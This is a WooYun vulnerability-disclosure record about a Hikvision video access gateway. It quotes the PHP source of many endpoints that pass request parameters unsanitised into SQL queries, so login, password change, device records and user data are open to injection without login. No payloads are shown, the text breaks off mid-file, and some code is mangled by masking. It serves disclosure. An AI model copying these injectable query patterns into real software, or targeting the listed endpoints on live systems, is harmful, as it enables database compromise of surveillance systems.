{"id": 87420, "wybug_id": "wooyun-2016-0180213", "wybug_title": "海康威视某视频接入网关系统漏洞集合(无需登录34处SQL注入&amp;文件遍历&amp;上传等)                                      ", "wybug_corp": "海康威视", "wybug_author": "YY-2012", "wybug_date": "2016-03-02 19:54", "wybug_open_date": "2016-06-04 10:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-09：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-04：\t细节向公众公开  简要描述： rt 详细说明：  第一处注入：/userInfo/userInfo.php\n<?php\tinclude('../common/connDb.php');\tinclude('roleInfoClass.php');\t$dbQuery = new DataBaseQuery();\t$isEmpty = empty($_GET['userId']);\t$userId = \"\";\t$name = \"\";\t$password = \"******\";\t$realName = \"\";\t$phone = \"\";\t$eMail = \"\";\t$roleId = \"\";\t$unitCode = \"\";\tif(!$isEmpty){\t\t$re = $dbQuery->query('select * from user_info where userId ='.$_GET['userId']);\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$userId = $row['userId'];\t\t\t$name = $row['name'];\t\t\t//$password = $row['password'];\t\t\t$realName = $row['realName'];\t\t\t$phone = $row['phone'];\t\t\t$eMail = $row['eMail'];\t\t\t$roleId = $row['roleId'];\t\t\t$unitCode= $row['unitCode'];\n第二处注入：/userInfo/roleInfo.php\n<?php\tinclude('../common/connDb.php');\t$dbQuery = new DataBaseQuery();\t$isEmpty = empty($_GET['roleId']);\t$roleId = \"\";\t$name = \"\";\t$description = \"\";\t$menuIds = \"\";\tif(!$isEmpty){\t\t$re = $dbQuery->query('select * from role_info where roleId ='.$_GET['roleId']);\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$roleId = $row['roleId'];\t\t\t$name = $row['name'];\t\t\t$description = $row['description'];\t\t\t$menuIds = $row['menuIds'];\t\t}\t}\n第三处注入：/data/fetchRoleTreeJson.php\n<?php\tinclude('../common/connDb.php');\t$type = $_GET['type'];\t$pNodeId = @$_GET['pNodeId'];\t$dbQuery = new DataBaseQuery();\tif($type==\"main\"){//取主菜单的树\t\tfindAllMainMenuNode($dbQuery);\t}else{//取子菜单的树\t\tfindAllSubMenuNode($dbQuery,$pNodeId);\t}\tclass TreeNode{\t  var $id;\t  var $text;\t  var $iconCls;\t  var $state;\t  var $children=array();\t  function __construct(){\t\t\t  }\t  public function setId($id)\t  {\t\t$this->id = $id;\t  }\t  public function setText($text)\t  {\t\t$this->text = $text;\t  }\t   public function setIconCls($iconCls)\t  {\t\t$this->iconCls = $iconCls;\t  }\t   public function setState($state)\t  {\t\t$this->state = $state;\t  }\t   public function setChildren($children)\t  {\t\t$this->children = $children;\t  }\t   public function getId()\t  {\t\treturn $this->id;\t  }\t  public function getText()\t  {\t\treturn $this->text;\t  }\t   public function getIconCls()\t  {\t\treturn $this->iconCls;\t  }\t   public function getState()\t  {\t\treturn $this->state;\t  }\t   public function getChildren()\t  {\t\treturn $this->children;\t  }\t\t}\t/**\t\t找出主菜单的树节点\t*/\tfunction findAllMainMenuNode($dbQuery){\t\t$jsonArray = array();\t\t$pNode = new TreeNode();\t\t$pNode->setId('0');\t\t$pNode->setText('主菜单');\t\t$pNode->setIconCls('icon-folder');\t\tarray_push($jsonArray,$pNode);\t\t$re= $dbQuery->query('select * from menu_info where level=1');//查询所有主菜单\t\twhile($row = $dbQuery->fetchArray($re)){\t\t\t$cNode = new TreeNode();\t\t\t$cNode->setId($row['menuId']);\t\t\t$cNode->setText($row['name']);\t\t\t$cNode->setIconCls('icon-systemMenu');\t\t\tif ($pNode->getChildren() != null) {\t\t\t\t\t$childrenArray = $pNode->getChildren();\t\t\t\t\tarray_push($childrenArray,$cNode);\t\t\t\t\t$pNode->setChildren($childrenArray);\t\t\t}else{\t\t\t\t\t$childrenNodes = array();\t\t\t\t\tarray_push($childrenNodes,$cNode);\t\t\t\t\t$pNode->setChildren($childrenNodes);\t\t\t}\t\t}\t\tprint_r(json_encode($jsonArray));\t\t$dbQuery->closeDb();\t}\t/**\t\t找出子菜单的树节点\t*/\tfunction findAllSubMenuNode($dbQuery,$pNodeId){\t\t$jsonArray = array();\t\t$pNode = new TreeNode();\t\t$pNode->setId('0');\t\t$pNode->setText('子菜单');\t\t$pNode->setIconCls('icon-folder');\t\tarray_push($jsonArray,$pNode);\t\t$re= $dbQuery->query('select * from menu_info where level=2 and parentMenuId='.$pNodeId);//根据父菜单查询所有子菜单\n第四处注入：/deviceConfig/configDeviceInfo.php\n<?php\tinclude('../common/connDb.php');\tinclude('deviceTypeClass.php');\t$deviceId = $_GET['deviceId'];\t$dbQuery = new DataBaseQuery();\t$re = $dbQuery->query('select type_code,name from device_type_info');\t$deviceTypeArray = array(); //获取所有设备类型\twhile ($row = $dbQuery->fetchArray($re)){\t\t$deviceType = new DeviceType($row['type_code'],$row['name']);\t\tarray_push($deviceTypeArray,$deviceType);\t}\t$re = $dbQuery->query('select id,name from device_group_info');\t$groupArray = array();\tarray_push($groupArray,new DeviceType(\"0\",\"请选择\"));\twhile ($row = $dbQuery->fetchArray($re)){\t\t$deviceType = new DeviceType($row['id'],$row['name']);\t\tarray_push($groupArray,$deviceType);\t}\t$type_code=\"\";\t$network_addr=\"\";\t$network_port=\"\";\t$username=\"\";\t$password=\"******\";\t$indexcode=\"\";\t$name=\"\";\t$serial_num=\"\";\t$analog_chan_count=\"\";\t$digital_chan_count=\"\";\t$alarm_in_count=\"\";\t$alarm_out_count=\"\";\t$audio_num=\"\";\t$reg_type=\"\";\t$group_id=\"\";\t$allowShare=\"\";\t$ctrl_unit_id =\"\";\t$re = $dbQuery->query('select * from device_info where id='.$deviceId);\n第五处注入：/transformServer/serverConfigInfo.php\n<?php\tinclude('../common/connDb.php');\t$dbQuery = new DataBaseQuery();\t$isEmpty = empty($_GET['transId']);\t$transId = \"\";\t$name = \"\";\t$transIp = \"\";\t$transPort = \"\";\t$transMax = \"\";\t$transType = \"\";\tif(!$isEmpty){\t\t$re = $dbQuery->query('select * from transform_server_info where transform_server_id ='.$_GET['transId']);\n第六处注入：/cameraConfig/transferInfo.php\n<?php\tinclude('../common/connDb.php');\t$dbQuery = new DataBaseQuery();\t$id = $_GET['id'];\t$src_audio_encode = \"-1\";\t$src_video_encode = \"-1\";\t$src_standard = \"0\";\t$src_stream_type = \"0\";\t$src_transform = \"-1\";\t$src_image_size = \"1\";\t$dst_audio_encode = \"2\";\t$dst_video_encode = \"1\";\t$dst_stream_type = \"0\";\t$dst_transform = \"2\";\t$dst_bitrate_type = \"1\";\t$dst_resolution = \"3\";\t$dst_video_bitrate = \"19\";\t$dst_framerate = \"-1\";\t$dst_interval_BPframe = \"2\";\t$dst_interval_Iframe = \"30\";\t$dst_pic_quality = \"0\";\t$transform_server_id = \"\";\t\t$re = $dbQuery->query('select * from camera_info where is_transform=1 and id ='.$id);\twhile ($row = $dbQuery->fetchArray($re)){\n第七处注入：/data/deviceAndCameraListData.php\ninclude('../common/connDb.php');\t\tinclude('../common/unitCode.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$sort=$_POST['sort'];\t\t$order=$_POST['order'];\t\t$start=($page -1)*$rows;\t\t$name=@$_POST['name'];\t\t$organize=@$_POST['organize'];\t\t$group=@$_POST['group'];\t\t$configFlag=@$_POST['configFlag'];\t\t$type=@$_GET['type'];\t\t$deviceIndexCode = @$_GET['deviceIndexCode'];\t\t$deviceId = @$_GET['deviceId'];\t\t$show = @$_GET['show'];\t\tif($type ==\"device\"){\t\t\t$whereStr=\"\";\t\t\tif($name != \"\"){\t\t\t\tif($name==\".\" || $name==\"%\" || $name==\"_\"){\t\t\t\t\t$name =\"[\".$name.\"]\";\t\t\t\t}\t\t\t\t$whereStr =\" and (d.name like '%\".$name.\"%' or **.**.**.**work_addr like '%\".$name.\"%')\";\t\t\t}\t\t\tif($organize != \"\"){\t\t\t\tif($organize ==\"0\"){ //如果是主控制中心则查询全部\t\t\t\t}else{\t\t\t\t\tif(strlen($organize)==8){//如果是派出所级别\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%'\";\t\t\t\t\t}else{\t\t\t\t\t\t$qxCode = substr($organize,4,2);\t\t\t\t\t\t$shiCode = substr($organize,2,2);\t\t\t\t\t\t$shengCode = substr($organize,0,2);\t\t\t\t\t\tif($shiCode==\"00\" && $qxCode==\"00\"){  //如果是省\t\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.\"%'\";\t\t\t\t\t\t}else if($shiCode !=\"00\" && $qxCode==\"00\"){  //如果是市\t\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.$shiCode.\"%'\";\t\t\t\t\t\t}else{\t\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%'\";\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\tif($group != \"\"){\t\t\t\tif($group==\"-1\"){\t\t\t\t}else{\t\t\t\t\t$whereStr =\" and d.group_id =\".$group;\t\t\t\t}\t\t\t\t}\t\t\t$str=\"\";\t\t\tif($configFlag == \"1\"){\t\t\t\t$str =\" and (c.is_transform is null or c.is_transform=0)\";\t\t\t}else if($configFlag == \"2\"){\t\t\t\t$str =\" and (c.is_stream_transmit is null or c.is_stream_transmit=0)\";\t\t\t}\t\t\t$re = $dbQuery->query('select distinct d.id,d.name,d.type_code,(select name from device_type_info where type_code = d.type_code) deviceType,d.reg_type regType,**.**.**.**work_addr networkAddr,**.**.**.**work_port networkPort,d.status,\"device\" type,d.indexcode,d.username,d.password from device_info d,camera_info c where d.indexcode=c.device_indexcode'.$unitWhere.$whereStr.$str.' order by d.'.$sort.' '.$order.' limit '.$start.','.$rows);\t\t\t$jsonArray = array();\t\t\t\t\t\t\t\t\t$count = $dbQuery->querySingle('select count(distinct d.id) from device_info d,camera_info c where d.indexcode=c.device_indexcode'.$unitWhere.$whereStr.$str);\t\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t\t$pNode = new TreeNode();\n第8处注入：/data/deviceTypeData.php\n<?php\t\t\tinclude('../common/connDb.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$start=($page -1)*$rows;\t\t$re = $dbQuery->query('select * from device_type_info limit '.$start.','.$rows);\t\t$count = $dbQuery->querySingle('select count(*) from device_type_info');\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\t\tif($jsonStr !=\"\"){\t\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t\t}\t\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t\t$dbQuery->closeDb();\t\techo ($str);?>\n第九处注入：/data/checkIsExist.php\n<?php\tinclude('../common/connDb.php');\t$dbQuery = new DataBaseQuery();\t$object=$_POST['object'];\tif($object==\"userInfo\"){  //如果是校验用户名称\t\t$name=$_POST['name'];\t\t$userId=$_POST['userId'];\t\tcheckUserName($dbQuery,$name,$userId);\t}else if($object==\"roleInfo\"){\t\t$name=$_POST['name'];\t\t$roleId=$_POST['roleId'];\t\tcheckRoleName($dbQuery,$name,$roleId);\t}else if($object==\"password\"){\t\t$name=$_POST['name'];\t\t$password=$_POST['password'];\t\tcheckPassword($dbQuery,$name,$password);\t}else if($object==\"deviceGroup\"){  //如果是校验用户名称\t\t$name=$_POST['name'];\t\t$groupId=$_POST['groupId'];\t\tcheckGroupName($dbQuery,$name,$groupId);\t}\tfunction checkUserName($dbQuery,$name,$userId){\t\t$count = 0;\t\tif($userId ==\"\"){\t\t\t$count = $dbQuery->querySingle('select count(*) from user_info where name=\"'.$name.'\"');\t\t}else{\t\t\t$count = $dbQuery->querySingle('select count(*) from user_info where name=\"'.$name.'\" and userId<>'.$userId);\t\t}\t\t\techo $count;\t\t$dbQuery->closeDb();\t}\tfunction checkRoleName($dbQuery,$name,$roleId){\t\t$count = 0;\t\tif($roleId ==\"\"){\t\t\t$count = $dbQuery->querySingle('select count(*) from role_info where name=\"'.$name.'\"');\t\t}else{\t\t\t$count = $dbQuery->querySingle('select count(*) from role_info where name=\"'.$name.'\" and roleId<>'.$roleId);\t\t}\t\t\techo $count;\t\t$dbQuery->closeDb();\t}\tfunction checkPassword($dbQuery,$name,$password){\t\t$oldPassword = $dbQuery->querySingle('select password from user_info where name=\"'.$name.'\"');\t\tif($password ==$oldPassword){\t\t\techo 0;\t\t}else{\t\t\techo 1;\t\t}\t\t$dbQuery->closeDb();\t}\tfunction checkGroupName($dbQuery,$name,$groupId){\t\t$count = 0;\t\tif($groupId ==\"\"){\t\t\t$count = $dbQuery->querySingle('select count(*) from device_group_info where name=\"'.$name.'\"');\t\t}else{\t\t\t$count = $dbQuery->querySingle('select count(*) from device_group_info where name=\"'.$name.'\" and id<>'.$groupId);\t\t}\t\t\techo $count;\t\t$dbQuery->closeDb();\t}?>\n第十处注入：/data/fetchIoInfoData.php\n<?php\tinclude('../common/connDb.php');\tinclude('../common/unitCode.php');\t$dbQuery = new DataBaseQuery();\t$page=$_POST['page'];\t$rows=$_POST['rows'];\t$sort=$_POST['sort'];\t$order=$_POST['order'];\t$start=($page -1)*$rows;\t$organize=@$_POST['organize'];\t$group=@$_POST['group'];\t$configFlag=@$_POST['configFlag'];\t\t$re = $dbQuery->query('select c.id,c.name,c.indexcode,d.name deviceName,**.**.**.**work_addr networkAddr,d.indexcode devIndexCode,d.type_code typeCode, c.globe_num from io_info c,device_info d where c.device_indexcode=d.indexcode order by c.id '.$order.' limit '.$start.','.$rows);\t$count = $dbQuery->querySingle('select count(*) from io_info c,device_info d where c.device_indexcode=d.indexcode');\t$jsonStr =\"\";\twhile ($row = $dbQuery->fetchArray($re)){\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t}\tif($jsonStr !=\"\"){\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t}\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t$dbQuery->closeDb();\techo ($str);?>\n第十一处：/data/saveDeviceType.php\n<?phpinclude('../common/connDb.php');$operate=$_POST['operate'];$typeCodes = @$_POST['typeCodes'];$typeCode= @$_POST['typeCode'];$name= @$_POST['name'];$manufacturer= @$_POST['manufacturer'];$registerType= @$_POST['registerType'];$accessType= @$_POST['accessType'];$equipmentType= @$_POST['equipmentType'];$otherMan= @$_POST['otherMan'];$port= @$_POST['port'];if($operate==\"delete\"){  //如果是删除操作\tdeleteDeviceType($typeCodes);}else if($operate==\"add\"){ //如果是增加操作\tsaveDeviceType($typeCode,$name,$manufacturer,$registerType,$accessType,$equipmentType,$otherMan,$port);}else{  //如果是修改操作\tupdateDeviceType($typeCode,$name,$manufacturer,$registerType,$accessType,$equipmentType,$otherMan,$port);}function deleteDeviceType($typeCodes){\t\t$dbQuery = new DataBaseQuery();\t\t$typeCodeArray = explode(\",\",$typeCodes);\t\t$codes=\"\";\t\tfor($i=0;$i<count($typeCodeArray);$i++){\t\t\t$count = $dbQuery->querySingle('select count(*) from device_info where type_code='.$typeCodeArray[$i]);\t\t\tif($count==0){\t\t\t\t$codes .=$typeCodeArray[$i].\",\"; \t\t\t}\t\t}\t\tif(strlen($codes)>0){\t\t\t$codes = substr($codes,0,strlen($codes)-1);\t\t}\t\t$query = $dbQuery->execute(\"delete from device_type_info where type_code in(\".$codes.\")\");\t\tif ($query) {\t\t\techo $codes;\t\t}else{\t\t\techo \"0\";\t\t}\t\t$dbQuery->closeDb();}function saveDeviceType($typeCode,$name,$manufacturer,$registerType,$accessType,$equipmentType,$otherMan,$port){\t\t$pulginId=\"\";\t\tif($accessType==\"GB28181\" || $accessType==\"E-home\" || $accessType==\"Onvif\" || $accessType==\"Pisa\" || $accessType==\"Hkp协议\"){\t\t\t$pulginId=\"\";\t\t}else{\t\t\t$pulginId=$accessType;\t\t}\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute('insert into device_type_info(type_code,name,manufacturer,register_type,access_type,equipment_type,plugin_id,update_time,int_rev,str_rev) values('.$typeCode.',\"'.$name.'\",\"'.$manufacturer.'\",'.$registerType.',\"'.$accessType.'\",\"'.$equipmentType.'\",\"'.$pulginId.'\",\"'.$time.'\",'.$port.',\"'.$otherMan.'\")');\t\tif ($query) {\t\t\techo $typeCode;\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();\t\t}function updateDeviceType($typeCode,$name,$manufacturer,$registerType,$accessType,$equipmentType,$otherMan,$port){\t\t$pulginId=\"\";\t\tif($accessType==\"GB28181\" || $accessType==\"E-home\" || $accessType==\"Onvif\" || $accessType==\"Pisa\" || $accessType==\"Hkp协议\"){\t\t\t$pulginId=\"\";\t\t}else{\t\t\t$pulginId=$accessType;\t\t}\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute('update device_type_info set name=\"'.$name.'\",manufacturer=\"'.$manufacturer.'\",register_type='.$registerType.',access_type=\"'.$accessType.'\",equipment_type=\"'.$equipmentType.'\",plugin_id=\"'.$pulginId.'\",update_time=\"'.$time.'\",int_rev='.$port.',str_rev=\"'.$otherMan.'\" where type_code='.$typeCode);\t\tif ($query) {\t\t\techo $typeCode;\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();}?>\n第十二处：/data/saveDecodeServer.php\n<?phpinclude('../common/connDb.php');$operate=$_POST['operate'];if($operate==\"delete\"){  //如果是删除操作\t$transIds = $_POST['transIds'];\tdeleteDecodeServer($transIds);}else{  //如果是增加或者修改操作\t$isEmpty=empty($_POST['transId']);\t$name=$_POST['name'];\t$transIp=$_POST['transIp'];\t$transPort=$_POST['transPort'];\t$transMax=$_POST['transMax'];\t$transType=$_POST['transType'];\tif($isEmpty){\t\tsaveDecodeServer($name,$transIp,$transPort,$transMax,$transType);\t}else{\t\tupdateDecodeServer($_POST['transId'],$name,$transIp,$transPort,$transMax,$transType);\t}\t}function deleteDecodeServer($transIds){\t\t$dbQuery = new DataBaseQuery();\t\t$query = $dbQuery->execute(\"delete from transform_server_info where transform_server_id in(\".$transIds.\")\");\t\tif ($query) {\t\t\techo \"0\";\t\t}else{\t\t\techo \"1\";\t\t}\t\t$dbQuery->closeDb();}function saveDecodeServer($name,$transIp,$transPort,$transMax,$transType){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute(\"insert into transform_server_info(transform_server_id,server_ip,server_port,name,trans_type,trans_max,update_time) values (NULL,'\".$transIp.\"',\".$transPort.\",'\".$name.\"',\".$transType.\",\".$transMax.\",'\".$time.\"')\");\t\tif ($query) {\t\t\techo $dbQuery->lastInsertRowID();\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();\t\t}function updateDecodeServer($transId,$name,$transIp,$transPort,$transMax,$transType){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute(\"update transform_server_info set server_ip='\".$transIp.\"',server_port=\".$transPort.\",name='\".$name.\"',trans_type=\".$transType.\",trans_max=\".$transMax.\",update_time='\".$time.\"' where transform_server_id=\".$transId);\t\tif ($query) {\t\t\techo $transId;\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();}?>\n第十三处：/data/fetchGroup.php\n<?php\t\t\t/*\t\t\t根据id找出分组\t\t*/\t\tinclude('../common/connDb.php');\t\t$dbQuery = new DataBaseQuery();\t\t$groupId=$_POST['groupId'];\t\t$groupArray = $dbQuery->querySingleRow('select id,name from device_group_info where id='.$groupId,true);\t\t$dbQuery->closeDb();\t\techo(json_encode($groupArray));?>\n第十四处：/data/login.php\n<?php\t/**\t\t系统登录设置\t*/\tinclude('../common/connDb.php');\t$dbQuery = new DataBaseQuery();\t$userName =$_POST['userName'];\t$password =$_POST['password'];\t$system =$_POST['system'];\t$userInfo = $dbQuery->querySingleRow('select password,roleId,unitCode from user_info where name=\"'.$userName.'\"',true);\tif(count($userInfo)==0){ //用户名不存在\t\techo \"1\";\t\t$dbQuery->closeDb();\t\treturn;\t}else{  //用户名存在\n第十五处：/data/transferCamera.php\n<?phpinclude('../common/connDb.php');$ids=@$_POST['ids'];$srcAudioType=$_POST['srcAudioType'];$srcVideoType=$_POST['srcVideoType'];$srcStandard=$_POST['srcStandard'];$srcStreamType=$_POST['srcStreamType'];$srcTransForm=$_POST['srcTransForm'];$srcImageSize=$_POST['srcImageSize'];$dstAudioType=$_POST['dstAudioType'];$dstVideoType=$_POST['dstVideoType'];$dstStreamType=$_POST['dstStreamType'];$dstTransForm=$_POST['dstTransForm'];$dstBitrateType=$_POST['dstBitrateType'];$dstResolution=$_POST['dstResolution'];$dstVideoBitrate=$_POST['dstVideoBitrate'];$dstFramerate=$_POST['dstFramerate'];$dstIntervalBPframe=$_POST['dstIntervalBPframe'];$dstIntervalIframe=$_POST['dstIntervalIframe'];$dstPicQuality=$_POST['dstPicQuality'];$transId=$_POST['transId'];$dbQuery = new DataBaseQuery();$idArray = explode(\",\",$ids);$cameraIds =\"\";for($i=0;$i<count($idArray);$i++){\t$cameraIds .=$idArray[$i].\",\";}$cameraIds = substr($cameraIds,0,strlen($cameraIds)-1);$query=$dbQuery->execute('update camera_info set is_transform=1,src_audio_encode='.$srcAudioType.',src_video_encode='.$srcVideoType.',src_standard='.$srcStandard.',src_transform='.$srcTransForm.',dst_audio_encode='.$dstAudioType.',dst_video_encode='.$dstVideoType.',dst_stream_type='.$dstStreamType.',dst_transform='.$dstTransForm.',dst_bitrate_type='.$dstBitrateType.',dst_resolution='.$dstResolution.',dst_video_bitrate='.$dstVideoBitrate.',dst_framerate='.$dstFramerate.',dst_interval_BPframe='.$dstIntervalBPframe.',dst_interval_Iframe='.$dstIntervalIframe.',dst_pic_quality='.$dstPicQuality.',transform_server_id='.$transId.' where id in('.$cameraIds.')');if($query){\techo \"0\";}else{\techo \"1\";}$dbQuery->closeDb();?>\n第十六处：/data/modifyPassword.php\n<?php\tinclude('../common/connDb.php');\t$name=$_POST['name'];\t$modPassword=$_POST['modPassword'];\t$dbQuery = new DataBaseQuery();\tdate_default_timezone_set('PRC');\t$time = date('Y-m-d H:i:s',time());\t$query = $dbQuery->execute(\"update user_info set password='\".$modPassword.\"',updataTime='\".$time.\"' where name='\".$name.\"'\");\tif ($query) {\t\techo 0;\t}else{\t\techo 1;\t}\t$dbQuery->closeDb();?>\n第十七处：/data/fetchDeviceByGroupId.php\n<?php\t\t\tinclude('../common/connDb.php');\t\tinclude('../common/unitCode.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$sort=$_POST['sort'];\t\t$order=$_POST['order'];\t\t\t$start=($page -1)*$rows;\t\t$groupId=@$_POST['groupId'];\t\t$queryStatus=@$_POST['queryStatus'];\t\t$name=@$_POST['name'];\t\t$whereStr=\"\";\t\tif($queryStatus==\"1\"){\t\t\t$whereStr=$whereStr.\" and (d.is_shared is null or d.is_shared =1)\";\t\t}\t\tif($name !=\"\"){\t\t\tif($name==\".\" || $name==\"%\" || $name==\"_\"){\t\t\t\t$name =\"[\".$name.\"]\";\t\t\t}\t\t\t$whereStr =$whereStr.\" and (d.name like '%\".$name.\"%' or **.**.**.**work_addr like '%\".$name.\"%')\";\t\t}\t\t$re = $dbQuery->query('select d.id,d.name,(select name from device_type_info where type_code = d.type_code) deviceType,d.reg_type,**.**.**.**work_addr,**.**.**.**work_port,d.status,d.is_shared shared from device_info d where d.allow_share=0 and d.group_id='.$groupId.$unitWhere.$whereStr.' order by d.'.$sort.' '.$order.' limit '.$start.','.$rows);\t\t$count = $dbQuery->querySingle('select count(*) from device_info d where d.allow_share=0 and d.group_id='.$groupId.$unitWhere.$whereStr);\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\t\tif($jsonStr !=\"\"){\t\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t\t}\t\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t\t$dbQuery->closeDb();\t\techo ($str);?>\n第十八处：/data/deleteDeviceInfo.php\n<?php\tinclude('../common/connDb.php');\t$deviceIds = @$_POST['deviceIds'];\t$dbQuery = new DataBaseQuery();\t$dbQuery->execute(\"delete from camera_info where device_id in(\".$deviceIds.\")\");\t$dbQuery->execute(\"delete from device_info where id in(\".$deviceIds.\")\");\techo \"0\";\t$dbQuery->closeDb();?>\n第十九处：/data/modifyDeviceInfo.php\n<?php\tinclude('../common/connDb.php');\t$deviceId = @$_POST['deviceId'];\t$register = @$_POST['register'];\t$typecode = @$_POST['typecode'];\t$addr = @$_POST['addr'];\t$port = @$_POST['port'];\t$username = @$_POST['username'];\t$password = @$_POST['password'];\t$password_old = @$_POST['password_old'];\t$groupId = @$_POST['groupId'];\t$oldAddr = @$_POST['oldAddr'];\t$oldPort = @$_POST['oldPort'];\t$allowShare = @$_POST['allowShare'];\t$dbQuery = new DataBaseQuery();\tdate_default_timezone_set('PRC');\t$time = date('Y-m-d H:i:s',time());\tif($register==\"4\"){ //如果是主动注册\t\t$query = $dbQuery->execute('update device_info set type_code='.$typecode.',group_id='.$groupId.',allow_share='.$allowShare.',update_time=\"'.$time.'\" where id='.$deviceId);\t\tif ($query) {\t\t\techo $deviceId;\t\t}else{\t\t\techo 0;\t\t}\t}else{\t\t//if($oldAddr != $addr || $oldPort != $port){//如果新的IP或端口不同于老的，则为新的设备，需要删除之前设备中的监控点\t\t//\t$dbQuery->execute('delete from camera_info where device_id='.$deviceId);\t\t//}\t\tif($password != $password_old){\t\t\t$query = $dbQuery->execute('update device_info set type_code='.$typecode.',network_addr=\"'.$addr.'\",network_port='.$port.',username=\"'.$username.'\",password=\"'.$password.'\",group_id='.$groupId.',allow_share='.$allowShare.',update_time=\"'.$time.'\" where id='.$deviceId);\t\t}\t\telse{\t\t\t$query = $dbQuery->execute('update device_info set type_code='.$typecode.',network_addr=\"'.$addr.'\",network_port='.$port.',username=\"'.$username.'\",group_id='.$groupId.',allow_share='.$allowShare.',update_time=\"'.$time.'\" where id='.$deviceId);\t\t}\t\tif ($query) {\t\t\techo $deviceId;\t\t}else{\t\t\techo 0;\t\t}\t}\t$dbQuery->closeDb();?>\n第二十处：/data/decodeServerData.php\n<?php\t\t\tinclude('../common/connDb.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$start=($page -1)*$rows;\t\t$re = $dbQuery->query('select * from transform_server_info limit '.$start.','.$rows);\t\t$count = $dbQuery->querySingle('select count(*) from transform_server_info');\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\t\tif($jsonStr !=\"\"){\t\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t\t}\t\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t\t$dbQuery->closeDb();\t\techo ($str);?>\n第二十一处：/data/userInfoData.php\n<?php\t\t\tinclude('../common/connDb.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$start=($page -1)*$rows;\t\t$re = $dbQuery->query('select * from user_info limit '.$start.','.$rows);\t\t$count = $dbQuery->querySingle('select count(*) from user_info');\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$row['unitCode']=fetchUnitName($row['unitCode']);\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\n第二十二处：/data/checkDevice.php\n<?php\tinclude('../common/connDb.php');\t$dbQuery = new DataBaseQuery();\t$type=$_POST['type'];\tif($type==\"singleIp\"){  //如果是单IP设备添加\t\t$singleIp_addr=$_POST['singleIp_addr'];\t\t$singleIp_port=$_POST['singleIp_port'];\t\tcheckSingleIp($dbQuery,$singleIp_addr,$singleIp_port);\t}else if($type==\"ipDomain\"){ //如果是IP段设备添加\t\t$ipDomain_startIp=$_POST['ipDomain_startIp'];\t\t$ipDomain_endIp=$_POST['ipDomain_endIp'];\t\t$ipDomain_port=$_POST['ipDomain_port'];\t\tcheckIpDomain($dbQuery,$ipDomain_startIp,$ipDomain_endIp,$ipDomain_port);\t}else 